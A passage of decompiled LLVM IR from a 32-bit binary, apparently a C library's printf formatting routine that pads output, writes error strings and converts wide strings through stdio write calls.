  br i1 %v2_805c439, label %dec_label_pc_805c43b, label %dec_label_pc_805c493

dec_label_pc_805c43b:                             ; preds = %dec_label_pc_805c436
  %v1_805c43b = add i32 %v0_805c1b4.lcssa, 344
  %v2_805c43b = inttoptr i32 %v1_805c43b to i32*
  %v3_805c43b = load i32, i32* %v2_805c43b, align 4
  store i32 %v3_805c43b, i32* %edx.global-to-local, align 4
  %v1_805c442 = icmp eq i1 %v9_805c436, false
  %v1_805c46d = inttoptr i32 %v3_805c43b to i32*
  %v2_805c46d = load i32, i32* %v1_805c46d, align 4
  br i1 %v1_805c442, label %dec_label_pc_805c46d, label %dec_label_pc_805c444

dec_label_pc_805c444:                             ; preds = %dec_label_pc_805c43b
  store i32 %v2_805c46d, i32* @edi, align 4
  %v1_805c446 = icmp eq i32 %v2_805c46d, 0
  %v2_805c446 = icmp slt i32 %v2_805c46d, 0
  store i1 %v2_805c446, i1* %sf.global-to-local, align 1
  br i1 %v1_805c446, label %dec_label_pc_805c4c1, label %dec_label_pc_805c44a

dec_label_pc_805c44a:                             ; preds = %dec_label_pc_805c444, %dec_label_pc_805c49c
  %v1_805c451 = phi i32 [ %v0_805c1b4.lcssa, %dec_label_pc_805c444 ], [ %v1_805c4b6, %dec_label_pc_805c49c ]
  %v1_805c44a = add i32 %v1_805c451, 20
  %v2_805c44a = inttoptr i32 %v1_805c44a to i32*
  %v3_805c44a = load i32, i32* %v2_805c44a, align 4
  store i32 %v3_805c44a, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_805c451 = add i32 %v1_805c451, -4
  %v3_805c451 = inttoptr i32 %v2_805c451 to i32*
  store i32 %v3_805c1b4, i32* %v3_805c451, align 4
  %v2_805c452 = add i32 %v1_805c451, -8
  %v3_805c452 = inttoptr i32 %v2_805c452 to i32*
  store i32 %v3_805c1b4, i32* %v3_805c452, align 4
  %v2_805c453 = icmp slt i32 %v3_805c44a, 0
  store i1 %v2_805c453, i1* %sf.global-to-local, align 1
  %v1_805c455 = icmp eq i1 %v2_805c453, false
  %v2_805c455 = load i32, i32* %eax.global-to-local, align 4
  %v4_805c455 = select i1 %v1_805c455, i32 %v3_805c44a, i32 %v2_805c455
  store i32 %v4_805c455, i32* %eax.global-to-local, align 4
  %v2_805c458 = add i32 %v1_805c451, -12
  %v3_805c458 = inttoptr i32 %v2_805c458 to i32*
  store i32 %v4_805c455, i32* %v3_805c458, align 4
  %v0_805c459 = load i32, i32* @edi, align 4
  %v2_805c459 = add i32 %v1_805c451, -16
  %v3_805c459 = inttoptr i32 %v2_805c459 to i32*
  store i32 %v0_805c459, i32* %v3_805c459, align 4
  %v0_805c45a = call i32 @strnlen()
  store i32 %v0_805c45a, i32* %eax.global-to-local, align 4
  %v0_805c45f = load i32, i32* @esp, align 4
  %v1_805c45f = add i32 %v0_805c45f, 16
  %v7_805c45f = icmp slt i32 %v1_805c45f, 0
  store i1 %v7_805c45f, i1* %sf.global-to-local, align 1
  store i32 %v0_805c45a, i32* @esi, align 4
  br label %dec_label_pc_805c464

dec_label_pc_805c464:                             ; preds = %dec_label_pc_805c42c, %dec_label_pc_805c44a
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_805c4d2

dec_label_pc_805c46d:                             ; preds = %dec_label_pc_805c43b
  store i32 %v2_805c46d, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_805c47b = add i32 %v0_805c1b4.lcssa, 204
  store i32 %v1_805c47b, i32* @edi, align 4
  %v1_805c482 = add i32 %v0_805c1b4.lcssa, 205
  %v2_805c482 = inttoptr i32 %v1_805c482 to i8*
  store i8 0, i8* %v2_805c482, align 1
  %v0_805c48a = load i32, i32* %eax.global-to-local, align 4
  %v1_805c48a = trunc i32 %v0_805c48a to i8
  %v2_805c48a = load i32, i32* @esp, align 4
  %v3_805c48a = add i32 %v2_805c48a, 204
  %v4_805c48a = inttoptr i32 %v3_805c48a to i8*
  store i8 %v1_805c48a, i8* %v4_805c48a, align 1
  br label %dec_label_pc_805c4d2

dec_label_pc_805c493:                             ; preds = %dec_label_pc_805c436
  %v1_805c493 = add i32 %v3_805c1b4, -20
  %v9_805c493 = icmp eq i32 %v1_805c493, 0
  %v10_805c493 = icmp slt i32 %v1_805c493, 0
  store i1 %v10_805c493, i1* %sf.global-to-local, align 1
  %v1_805c496 = icmp eq i1 %v9_805c493, false
  br i1 %v1_805c496, label %dec_label_pc_805c637, label %dec_label_pc_805c49c

dec_label_pc_805c49c:                             ; preds = %dec_label_pc_805c493
  %v0_805c49c = load i32, i32* %stack_var_-364, align 4
  %v1_805c49c = call i32 @__errno_location(i32 %v0_805c49c)
  store i32 %v1_805c49c, i32* %eax.global-to-local, align 4
  %v0_805c4a1 = load i32, i32* @edx, align 4
  %v1_805c4a1 = load i32, i32* @esp, align 4
  %v2_805c4a1 = add i32 %v1_805c4a1, -4
  %v3_805c4a1 = inttoptr i32 %v2_805c4a1 to i32*
  store i32 %v0_805c4a1, i32* %v3_805c4a1, align 4
  %v1_805c4a2 = add i32 %v1_805c4a1, -8
  %v2_805c4a2 = inttoptr i32 %v1_805c4a2 to i32*
  store i32 128, i32* %v2_805c4a2, align 4
  %v1_805c4a7 = add i32 %v1_805c4a1, 204
  store i32 %v1_805c4a7, i32* %edx.global-to-local, align 4
  %v2_805c4ae = add i32 %v1_805c4a1, -12
  %v3_805c4ae = inttoptr i32 %v2_805c4ae to i32*
  store i32 %v1_805c4a7, i32* %v3_805c4ae, align 4
  %v1_805c4af = inttoptr i32 %v1_805c49c to i32*
  %v2_805c4af = load i32, i32* %v1_805c4af, align 4
  %v4_805c4af = add i32 %v1_805c4a1, -16
  %v5_805c4af = inttoptr i32 %v4_805c4af to i32*
  store i32 %v2_805c4af, i32* %v5_805c4af, align 4
  %v0_805c4b1 = load i32, i32* %stack_var_-364, align 4
  %v3_805c4b1 = call i32 @__GI___glibc_strerror_r(i32 %v0_805c4b1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805c4b1, i32* %eax.global-to-local, align 4
  %v0_805c4b6 = load i32, i32* @esp, align 4
  %v1_805c4b6 = add i32 %v0_805c4b6, 16
  %v7_805c4b6 = icmp slt i32 %v1_805c4b6, 0
  store i1 %v7_805c4b6, i1* %sf.global-to-local, align 1
  store i32 %v3_805c4b1, i32* @edi, align 4
  br label %dec_label_pc_805c44a

dec_label_pc_805c4bd:                             ; preds = %dec_label_pc_805c33e, %dec_label_pc_805c337, %dec_label_pc_805c324
  %v0_805c4da35 = phi i32 [ %v1_805c2cd, %dec_label_pc_805c33e ], [ 0, %dec_label_pc_805c337 ], [ 5, %dec_label_pc_805c324 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805c4d7

dec_label_pc_805c4c1:                             ; preds = %dec_label_pc_805c444, %dec_label_pc_805c3b6
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806da12.694 to i32), i32* @edi, align 4
  br label %dec_label_pc_805c4d2

dec_label_pc_805c4d2:                             ; preds = %dec_label_pc_805c46d, %dec_label_pc_805c464, %dec_label_pc_805c3f8, %dec_label_pc_805c4c1
  %v0_805c4d2 = load i32, i32* @esp, align 4
  %v1_805c4d2 = add i32 %v0_805c4d2, 7
  %v2_805c4d2 = inttoptr i32 %v1_805c4d2 to i8*
  store i8 32, i8* %v2_805c4d2, align 1
  %v0_805c4da.pre = load i32, i32* @esi, align 4
  %v1_805c4da.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c4d7

dec_label_pc_805c4d7:                             ; preds = %dec_label_pc_805c4bd, %dec_label_pc_805c346, %dec_label_pc_805c4d2
  %v1_805c4da = phi i32 [ 0, %dec_label_pc_805c4bd ], [ %v2_805c33e, %dec_label_pc_805c346 ], [ %v1_805c4da.pre, %dec_label_pc_805c4d2 ]
  %v0_805c4da = phi i32 [ %v0_805c4da35, %dec_label_pc_805c4bd ], [ %v1_805c2cd, %dec_label_pc_805c346 ], [ %v0_805c4da.pre, %dec_label_pc_805c4d2 ]
  %v0_805c4d7 = load i32, i32* @ebp, align 4
  %v1_805c4d7 = add i32 %v0_805c4d7, -11
  %v9_805c4d7 = icmp eq i32 %v1_805c4d7, 0
  %v10_805c4d7 = icmp slt i32 %v1_805c4d7, 0
  store i1 %v10_805c4d7, i1* %sf.global-to-local, align 1
  %v2_805c4da = add i32 %v0_805c4da, %v1_805c4da
  store i32 %v2_805c4da, i32* @edx, align 4
  br i1 %v9_805c4d7, label %dec_label_pc_805c4eb, label %dec_label_pc_805c4df

dec_label_pc_805c4df:                             ; preds = %dec_label_pc_805c4d7
  %v1_805c4e1 = add i32 %v0_805c4d7, -5
  %v6_805c4e1 = sub i32 4, %v0_805c4d7
  %v7_805c4e1 = and i32 %v6_805c4e1, %v0_805c4d7
  %v8_805c4e1 = icmp slt i32 %v7_805c4e1, 0
  %v9_805c4e1 = icmp eq i32 %v1_805c4e1, 0
  %v10_805c4e1 = icmp slt i32 %v1_805c4e1, 0
  store i1 %v10_805c4e1, i1* %sf.global-to-local, align 1
  %v3_805c4e4 = icmp eq i1 %v10_805c4e1, %v8_805c4e1
  %v4_805c4e4 = icmp eq i1 %v9_805c4e1, false
  %v5_805c4e4 = and i1 %v4_805c4e4, %v3_805c4e4
  %v6_805c4e4 = zext i1 %v5_805c4e4 to i32
  store i32 %v6_805c4e4, i32* %eax.global-to-local, align 4
  %v2_805c4e7 = add i32 %v2_805c4da, 1
  %v3_805c4e7 = add i32 %v2_805c4e7, %v6_805c4e4
  store i32 %v3_805c4e7, i32* @edx, align 4
  br label %dec_label_pc_805c4eb

dec_label_pc_805c4eb:                             ; preds = %dec_label_pc_805c4d7, %dec_label_pc_805c4df
  %v0_805c4eb = load i32, i32* @esp, align 4
  %v1_805c4eb = add i32 %v0_805c4eb, 24
  %v2_805c4eb = inttoptr i32 %v1_805c4eb to i32*
  %v3_805c4eb = load i32, i32* %v2_805c4eb, align 4
  store i32 %v3_805c4eb, i32* %eax.global-to-local, align 4
  %v1_805c4ef = add i32 %v0_805c4eb, 8
  %v2_805c4ef = inttoptr i32 %v1_805c4ef to i32*
  store i32 0, i32* %v2_805c4ef, align 4
  %v0_805c4f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c4f7 = load i32, i32* @edx, align 4
  %v2_805c4f7 = sub i32 %v0_805c4f7, %v1_805c4f7
  %v7_805c4f7 = icmp ult i32 %v0_805c4f7, %v1_805c4f7
  %v12_805c4f7 = icmp eq i32 %v2_805c4f7, 0
  %v13_805c4f7 = icmp slt i32 %v2_805c4f7, 0
  store i1 %v13_805c4f7, i1* %sf.global-to-local, align 1
  %v2_805c4f9 = or i1 %v7_805c4f7, %v12_805c4f7
  br i1 %v2_805c4f9, label %dec_label_pc_805c501, label %dec_label_pc_805c4fb

dec_label_pc_805c4fb:                             ; preds = %dec_label_pc_805c4eb
  store i1 %v13_805c4f7, i1* %sf.global-to-local, align 1
  store i32 %v2_805c4f7, i32* %eax.global-to-local, align 4
  %v1_805c4fd = load i32, i32* @esp, align 4
  %v2_805c4fd = add i32 %v1_805c4fd, 8
  %v3_805c4fd = inttoptr i32 %v2_805c4fd to i32*
  store i32 %v2_805c4f7, i32* %v3_805c4fd, align 4
  %v0_805c505.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805c501

dec_label_pc_805c501:                             ; preds = %dec_label_pc_805c4eb, %dec_label_pc_805c4fb
  %v0_805c505 = phi i32 [ %v1_805c4f7, %dec_label_pc_805c4eb ], [ %v0_805c505.pre, %dec_label_pc_805c4fb ]
  %v0_805c501 = load i32, i32* @esp, align 4
  %v1_805c501 = add i32 %v0_805c501, 8
  %v2_805c501 = inttoptr i32 %v1_805c501 to i32*
  %v3_805c501 = load i32, i32* %v2_805c501, align 4
  store i32 %v3_805c501, i32* @ecx, align 4
  %v2_805c505 = add i32 %v3_805c501, %v0_805c505
  store i32 %v2_805c505, i32* %eax.global-to-local, align 4
  %v1_805c508 = inttoptr i32 %v0_805c501 to i32*
  %v2_805c508 = load i32, i32* %v1_805c508, align 4
  %v4_805c508 = add i32 %v2_805c508, %v2_805c505
  %v15_805c508 = icmp slt i32 %v4_805c508, 0
  store i1 %v15_805c508, i1* %sf.global-to-local, align 1
  store i32 %v4_805c508, i32* %v1_805c508, align 4
  %v0_805c50b = load i32, i32* @esp, align 4
  %v1_805c50b = add i32 %v0_805c50b, 7
  %v2_805c50b = inttoptr i32 %v1_805c50b to i8*
  %v3_805c50b = load i8, i8* %v2_805c50b, align 1
  %v4_805c50b = add i8 %v3_805c50b, -48
  %v9_805c50b = icmp eq i8 %v4_805c50b, 0
  %v10_805c50b = icmp slt i8 %v4_805c50b, 0
  store i1 %v10_805c50b, i1* %sf.global-to-local, align 1
  %v1_805c510 = icmp eq i1 %v9_805c50b, false
  br i1 %v1_805c510, label %dec_label_pc_805c51c, label %dec_label_pc_805c512

dec_label_pc_805c512:                             ; preds = %dec_label_pc_805c501
  %v0_805c512 = load i32, i32* @ebx, align 4
  %v1_805c512 = load i32, i32* @ecx, align 4
  %v2_805c512 = add i32 %v1_805c512, %v0_805c512
  %v13_805c512 = icmp slt i32 %v2_805c512, 0
  store i1 %v13_805c512, i1* %sf.global-to-local, align 1
  store i32 %v2_805c512, i32* @ebx, align 4
  %v1_805c514 = add i32 %v0_805c50b, 8
  %v2_805c514 = inttoptr i32 %v1_805c514 to i32*
  store i32 0, i32* %v2_805c514, align 4
  %v0_805c51c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c51c

dec_label_pc_805c51c:                             ; preds = %dec_label_pc_805c501, %dec_label_pc_805c512
  %v0_805c523 = phi i32 [ %v0_805c50b, %dec_label_pc_805c501 ], [ %v0_805c51c.pre, %dec_label_pc_805c512 ]
  %v1_805c51c = add i32 %v0_805c523, 32
  %v2_805c51c = inttoptr i32 %v1_805c51c to i8*
  %v3_805c51c = load i8, i8* %v2_805c51c, align 1
  %v4_805c51c = and i8 %v3_805c51c, 8
  %v5_805c51c = icmp eq i8 %v4_805c51c, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805c521 = icmp eq i1 %v5_805c51c, false
  br i1 %v1_805c521, label %dec_label_pc_805c54a, label %dec_label_pc_805c523

dec_label_pc_805c523:                             ; preds = %dec_label_pc_805c51c
  %v1_805c523 = add i32 %v0_805c523, 8
  %v2_805c523 = inttoptr i32 %v1_805c523 to i32*
  %v3_805c523 = load i32, i32* %v2_805c523, align 4
  store i32 %v3_805c523, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805c52c = add i32 %v0_805c523, 368
  %v2_805c52c = inttoptr i32 %v1_805c52c to i32*
  %v3_805c52c = load i32, i32* %v2_805c52c, align 4
  store i32 %v3_805c52c, i32* @eax, align 4
  %v0_805c533 = call i32 @_charpad()
  store i32 %v0_805c533, i32* %eax.global-to-local, align 4
  %v1_805c538 = load i32, i32* @esp, align 4
  %v2_805c538 = add i32 %v1_805c538, 8
  %v3_805c538 = inttoptr i32 %v2_805c538 to i32*
  %v4_805c538 = load i32, i32* %v3_805c538, align 4
  %v5_805c538 = sub i32 %v0_805c533, %v4_805c538
  %v15_805c538 = icmp eq i32 %v5_805c538, 0
  %v16_805c538 = icmp slt i32 %v5_805c538, 0
  store i1 %v16_805c538, i1* %sf.global-to-local, align 1
  %v1_805c53c = icmp eq i1 %v15_805c538, false
  br i1 %v1_805c53c, label %dec_label_pc_805c637, label %dec_label_pc_805c542

dec_label_pc_805c542:                             ; preds = %dec_label_pc_805c523
  store i32 0, i32* %v3_805c538, align 4
  %v1_805c54a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805c54a

dec_label_pc_805c54a:                             ; preds = %dec_label_pc_805c51c, %dec_label_pc_805c542
  %v1_805c54a = phi i32 [ %v0_805c523, %dec_label_pc_805c51c ], [ %v1_805c54a.pre, %dec_label_pc_805c542 ]
  %v0_805c54a = load i32, i32* %eax.global-to-local, align 4
  %v2_805c54a = add i32 %v1_805c54a, -4
  %v3_805c54a = inttoptr i32 %v2_805c54a to i32*
  store i32 %v0_805c54a, i32* %v3_805c54a, align 4
  %v0_805c54b = load i32, i32* %eax.global-to-local, align 4
  %v2_805c54b = add i32 %v1_805c54a, -8
  %v3_805c54b = inttoptr i32 %v2_805c54b to i32*
  store i32 %v0_805c54b, i32* %v3_805c54b, align 4
  %v1_805c54c = add i32 %v1_805c54a, 368
  %v2_805c54c = inttoptr i32 %v1_805c54c to i32*
  %v3_805c54c = load i32, i32* %v2_805c54c, align 4
  %v5_805c54c = add i32 %v1_805c54a, -12
  %v6_805c54c = inttoptr i32 %v5_805c54c to i32*
  store i32 %v3_805c54c, i32* %v6_805c54c, align 4
  %v0_805c553 = load i32, i32* @ebp, align 4
  %v1_805c553 = add i32 %v0_805c553, ptrtoint (i32* @global_var_806da19.695 to i32)
  store i32 %v1_805c553, i32* %eax.global-to-local, align 4
  %v2_805c559 = add i32 %v1_805c54a, -16
  %v3_805c559 = inttoptr i32 %v2_805c559 to i32*
  store i32 %v1_805c553, i32* %v3_805c559, align 4
  %v0_805c55a = load i32, i32* %stack_var_-364, align 4
  %v4_805c55a = inttoptr i32 %v0_805c55a to i8*
  %v5_805c55a = call i32 @__GI_fputs_unlocked(i8* %v4_805c55a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805c55a, i32* %eax.global-to-local, align 4
  %v0_805c55f = load i32, i32* @esp, align 4
  %v1_805c55f = add i32 %v0_805c55f, 384
  %v2_805c55f = inttoptr i32 %v1_805c55f to i32*
  %v3_805c55f = load i32, i32* %v2_805c55f, align 4
  store i32 %v3_805c55f, i32* @eax, align 4
  %v0_805c566 = load i32, i32* @ebx, align 4
  store i32 %v0_805c566, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_805c56d = call i32 @_charpad()
  store i32 %v0_805c56d, i32* %eax.global-to-local, align 4
  %v0_805c572 = load i32, i32* @esp, align 4
  %v1_805c572 = add i32 %v0_805c572, 16
  %v1_805c575 = load i32, i32* @ebx, align 4
  %v2_805c575 = sub i32 %v0_805c56d, %v1_805c575
  %v12_805c575 = icmp eq i32 %v2_805c575, 0
  %v13_805c575 = icmp slt i32 %v2_805c575, 0
  store i1 %v13_805c575, i1* %sf.global-to-local, align 1
  %v1_805c577 = icmp eq i1 %v12_805c575, false
  br i1 %v1_805c577, label %dec_label_pc_805c637, label %dec_label_pc_805c57d

dec_label_pc_805c57d:                             ; preds = %dec_label_pc_805c54a
  %v1_805c57d = add i32 %v0_805c572, 356
  %v2_805c57d = inttoptr i32 %v1_805c57d to i32*
  %v3_805c57d = load i32, i32* %v2_805c57d, align 4
  %v4_805c57d = icmp eq i32 %v3_805c57d, 0
  %v5_805c57d = icmp slt i32 %v3_805c57d, 0
  store i1 %v5_805c57d, i1* %sf.global-to-local, align 1
  %v1_805c585 = icmp eq i1 %v4_805c57d, false
  br i1 %v1_805c585, label %dec_label_pc_805c5a9, label %dec_label_pc_805c587

dec_label_pc_805c587:                             ; preds = %dec_label_pc_805c57d
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805c589 = load i32, i32* @esi, align 4
  %v1_805c589 = icmp eq i32 %v0_805c589, 0
  %v2_805c589 = icmp slt i32 %v0_805c589, 0
  store i1 %v2_805c589, i1* %sf.global-to-local, align 1
  br i1 %v1_805c589, label %dec_label_pc_805c59f, label %dec_label_pc_805c58d

dec_label_pc_805c58d:                             ; preds = %dec_label_pc_805c587
  %v2_805c58d = add i32 %v0_805c572, 12
  %v3_805c58d = inttoptr i32 %v2_805c58d to i32*
  store i32 0, i32* %v3_805c58d, align 4
  %v1_805c58e = add i32 %v0_805c572, 384
  %v2_805c58e = inttoptr i32 %v1_805c58e to i32*
  %v3_805c58e = load i32, i32* %v2_805c58e, align 4
  %v5_805c58e = add i32 %v0_805c572, 8
  %v6_805c58e = inttoptr i32 %v5_805c58e to i32*
  store i32 %v3_805c58e, i32* %v6_805c58e, align 4
  %v0_805c595 = load i32, i32* @esi, align 4
  %v2_805c595 = add i32 %v0_805c572, 4
  %v3_805c595 = inttoptr i32 %v2_805c595 to i32*
  store i32 %v0_805c595, i32* %v3_805c595, align 4
  %v0_805c596 = load i32, i32* @edi, align 4
  %v3_805c596 = inttoptr i32 %v0_805c572 to i32*
  store i32 %v0_805c596, i32* %v3_805c596, align 4
  %v0_805c597 = load i32, i32* %stack_var_-364, align 4
  %v4_805c597 = call i32 @__stdio_fwrite(i32 %v0_805c597, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805c597, i32* %eax.global-to-local, align 4
  %v0_805c59c = load i32, i32* @esp, align 4
  %v1_805c59c = add i32 %v0_805c59c, 16
  %v7_805c59c = icmp slt i32 %v1_805c59c, 0
  store i1 %v7_805c59c, i1* %sf.global-to-local, align 1
  %v1_805c59f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c59f

dec_label_pc_805c59f:                             ; preds = %dec_label_pc_805c587, %dec_label_pc_805c58d
  %v0_805c60947 = phi i32 [ %v1_805c572, %dec_label_pc_805c587 ], [ %v1_805c59c, %dec_label_pc_805c58d ]
  %v1_805c59f = phi i32 [ 0, %dec_label_pc_805c587 ], [ %v1_805c59f.pre, %dec_label_pc_805c58d ]
  %v0_805c59f = phi i32 [ 0, %dec_label_pc_805c587 ], [ %v4_805c597, %dec_label_pc_805c58d ]
  %v2_805c59f = sub i32 %v0_805c59f, %v1_805c59f
  %v12_805c59f = icmp eq i32 %v2_805c59f, 0
  %v13_805c59f = icmp slt i32 %v2_805c59f, 0
  store i1 %v13_805c59f, i1* %sf.global-to-local, align 1
  %v1_805c5a1 = icmp eq i1 %v12_805c59f, false
  br i1 %v1_805c5a1, label %dec_label_pc_805c637, label %dec_label_pc_805c609

dec_label_pc_805c5a9:                             ; preds = %dec_label_pc_805c57d
  %v1_805c5a9 = add i32 %v0_805c572, 348
  %v2_805c5a9 = inttoptr i32 %v1_805c5a9 to i32*
  store i32 0, i32* %v2_805c5a9, align 4
  %v0_805c6059 = load i32, i32* @esi, align 4
  %v1_805c60510 = icmp eq i32 %v0_805c6059, 0
  %v2_805c60511 = icmp slt i32 %v0_805c6059, 0
  store i1 %v2_805c60511, i1* %sf.global-to-local, align 1
  %v1_805c60717 = icmp eq i1 %v1_805c60510, false
  %v0_805c5b6.pre = load i32, i32* @esp, align 4
  br i1 %v1_805c60717, label %dec_label_pc_805c5b6, label %dec_label_pc_805c609

dec_label_pc_805c5b6:                             ; preds = %dec_label_pc_805c5a9, %dec_label_pc_805c603
  %v0_805c5bd = phi i32 [ %v2_805c603, %dec_label_pc_805c603 ], [ %v0_805c6059, %dec_label_pc_805c5a9 ]
  %v1_805c5c8 = phi i32 [ %v0_805c5b642, %dec_label_pc_805c603 ], [ %v0_805c5b6.pre, %dec_label_pc_805c5a9 ]
  %v1_805c5b6 = add i32 %v1_805c5c8, 332
  store i32 %v1_805c5b6, i32* %edx.global-to-local, align 4
  %v1_805c5bd = add i32 %v0_805c5bd, -128
  %v2_805c5bd = icmp ult i32 %v0_805c5bd, 128
  %v6_805c5bd = icmp eq i32 %v1_805c5bd, 0
  %v7_805c5bd = icmp slt i32 %v1_805c5bd, 0
  store i1 %v7_805c5bd, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_805c5c8 = add i32 %v1_805c5c8, -4
  %v3_805c5c8 = inttoptr i32 %v2_805c5c8 to i32*
  store i32 %v1_805c5b6, i32* %v3_805c5c8, align 4
  %v2_805c5c9 = or i1 %v2_805c5bd, %v6_805c5bd
  %v3_805c5c9 = load i32, i32* %eax.global-to-local, align 4
  %v4_805c5c9 = load i32, i32* @esi, align 4
  %v5_805c5c9 = select i1 %v2_805c5c9, i32 %v4_805c5c9, i32 %v3_805c5c9
  %v2_805c5cc = add i32 %v1_805c5c8, -8
  %v3_805c5cc = inttoptr i32 %v2_805c5cc to i32*
  store i32 %v5_805c5c9, i32* %v3_805c5cc, align 4
  %v1_805c5cd = add i32 %v1_805c5c8, 340
  store i32 %v1_805c5cd, i32* %eax.global-to-local, align 4
  %v2_805c5d4 = add i32 %v1_805c5c8, -12
  %v3_805c5d4 = inttoptr i32 %v2_805c5d4 to i32*
  store i32 %v1_805c5cd, i32* %v3_805c5d4, align 4
  %v1_805c5d5 = add i32 %v1_805c5c8, 204
  store i32 %v1_805c5d5, i32* @edi, align 4
  %v2_805c5dc = add i32 %v1_805c5c8, -16
  %v3_805c5dc = inttoptr i32 %v2_805c5dc to i32*
  store i32 %v1_805c5d5, i32* %v3_805c5dc, align 4
  %v0_805c5dd = call i32 @__GI_wcsrtombs()
  %v0_805c5e2 = load i32, i32* @esp, align 4
  %v1_805c5e2 = add i32 %v0_805c5e2, 16
  store i32 %v0_805c5dd, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805c5e9 = icmp eq i32 %v0_805c5dd, 0
  %v2_805c5e9 = icmp slt i32 %v0_805c5dd, 0
  store i1 %v2_805c5e9, i1* %sf.global-to-local, align 1
  br i1 %v1_805c5e9, label %dec_label_pc_805c5ff, label %dec_label_pc_805c5ed

dec_label_pc_805c5ed:                             ; preds = %dec_label_pc_805c5b6
  %v0_805c5ed = load i32, i32* @ebp, align 4
  %v2_805c5ed = add i32 %v0_805c5e2, 12
  %v3_805c5ed = inttoptr i32 %v2_805c5ed to i32*
  store i32 %v0_805c5ed, i32* %v3_805c5ed, align 4
  %v1_805c5ee = add i32 %v0_805c5e2, 384
  %v2_805c5ee = inttoptr i32 %v1_805c5ee to i32*
  %v3_805c5ee = load i32, i32* %v2_805c5ee, align 4
  %v5_805c5ee = add i32 %v0_805c5e2, 8
  %v6_805c5ee = inttoptr i32 %v5_805c5ee to i32*
  store i32 %v3_805c5ee, i32* %v6_805c5ee, align 4
  %v2_805c5f5 = add i32 %v0_805c5e2, 4
  %v3_805c5f5 = inttoptr i32 %v2_805c5f5 to i32*
  store i32 %v0_805c5dd, i32* %v3_805c5f5, align 4
  %v0_805c5f6 = load i32, i32* @edi, align 4
  %v3_805c5f6 = inttoptr i32 %v0_805c5e2 to i32*
  store i32 %v0_805c5f6, i32* %v3_805c5f6, align 4
  %v0_805c5f7 = load i32, i32* %stack_var_-364, align 4
  %v4_805c5f7 = call i32 @__stdio_fwrite(i32 %v0_805c5f7, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805c5f7, i32* %eax.global-to-local, align 4
  %v0_805c5fc = load i32, i32* @esp, align 4
  %v1_805c5fc = add i32 %v0_805c5fc, 16
  %v7_805c5fc = icmp slt i32 %v1_805c5fc, 0
  store i1 %v7_805c5fc, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805c5ff

dec_label_pc_805c5ff:                             ; preds = %dec_label_pc_805c5b6, %dec_label_pc_805c5ed
  %v1_805c603 = phi i32 [ 0, %dec_label_pc_805c5b6 ], [ %v4_805c5f7, %dec_label_pc_805c5ed ]
  %v0_805c5b642 = phi i32 [ %v1_805c5e2, %dec_label_pc_805c5b6 ], [ %v1_805c5fc, %dec_label_pc_805c5ed ]
  %v2_805c5ff = sub i32 %v1_805c603, %v0_805c5dd
  %v12_805c5ff = icmp eq i32 %v2_805c5ff, 0
  %v13_805c5ff = icmp slt i32 %v2_805c5ff, 0
  store i1 %v13_805c5ff, i1* %sf.global-to-local, align 1
  %v1_805c601 = icmp eq i1 %v12_805c5ff, false
  br i1 %v1_805c601, label %dec_label_pc_805c637, label %dec_label_pc_805c603

dec_label_pc_805c603:                             ; preds = %dec_label_pc_805c5ff
  %v0_805c603 = load i32, i32* @esi, align 4
  %v2_805c603 = sub i32 %v0_805c603, %v1_805c603
  %v12_805c603 = icmp eq i32 %v2_805c603, 0
  %v13_805c603 = icmp slt i32 %v2_805c603, 0
  store i32 %v2_805c603, i32* @esi, align 4
  store i1 %v13_805c603, i1* %sf.global-to-local, align 1
  %v1_805c607 = icmp eq i1 %v12_805c603, false
  br i1 %v1_805c607, label %dec_label_pc_805c5b6, label %dec_label_pc_805c609

dec_label_pc_805c609:                             ; preds = %dec_label_pc_805c603, %dec_label_pc_805c5a9, %dec_label_pc_805c59f
  %v0_805c609 = phi i32 [ %v0_805c60947, %dec_label_pc_805c59f ], [ %v0_805c5b6.pre, %dec_label_pc_805c5a9 ], [ %v0_805c5b642, %dec_label_pc_805c603 ]
  %v1_805c609 = add i32 %v0_805c609, 8
  %v2_805c609 = inttoptr i32 %v1_805c609 to i32*
  %v3_805c609 = load i32, i32* %v2_805c609, align 4
  store i32 %v3_805c609, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805c612 = add i32 %v0_805c609, 368
  %v2_805c612 = inttoptr i32 %v1_805c612 to i32*
  %v3_805c612 = load i32, i32* %v2_805c612, align 4
  store i32 %v3_805c612, i32* @eax, align 4
  %v0_805c619 = call i32 @_charpad()
  store i32 %v0_805c619, i32* %eax.global-to-local, align 4
  %v1_805c61e = load i32, i32* @esp, align 4
  %v2_805c61e = add i32 %v1_805c61e, 8
